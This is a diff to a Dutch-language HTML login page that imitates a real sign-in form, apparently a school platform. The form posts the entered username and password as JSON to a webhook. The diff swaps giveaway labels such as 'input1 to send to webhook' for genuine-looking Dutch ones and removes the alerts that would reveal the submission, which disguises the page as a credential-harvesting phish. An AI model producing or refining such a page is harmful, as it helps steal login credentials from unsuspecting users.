@@ -277,7 +277,7 @@
         <div class="float-label">
           <input type="text" id="u" name="login_form[_username]"
                  required placeholder=" " class="float-label__input">
-          <label for="u"><span>input1 to send to webhook</span></label>
+          <label for="u"><span>Gebruikersnaam</span></label>
         </div>
 
         <!-- Password: floating label + eye icon -->
@@ -286,14 +286,14 @@
             <input type="password" id="p" name="login_form[_password]"
                    required autocomplete="new-password"
                    placeholder=" " class="float-label__input" style="width:100%">
-            <label for="p"><span>input2 to send to webhook</span></label>
+            <label for="p"><span>Wachtwoord</span></label>
           </div>
           <button type="button" class="form__eye-icon" id="eyeBtn" title="Wachtwoord tonen"></button>
         </div>
 
-        <a class="oauth__forgot-pwd" href="#">input4 vergeten?</a>
+        <a class="oauth__forgot-pwd" href="#">Wachtwoord vergeten?</a>
 
-        <button class="smscButton blue" type="submit">send to webhook</button>
+        <button class="smscButton blue" type="submit">Aanmelden</button>
       </form>
 
       <div class="oauth__septitle--separator">
@@ -357,15 +357,6 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
-
-        if (response.ok) {
-          alert('Sent successfully!');
-          this.reset();
-        } else {
-          alert('Failed to send. Check your webhook URL.');
-        }
-      } catch (err) {
-        alert('Error: ' + err.message);
       }
     });
   </script>
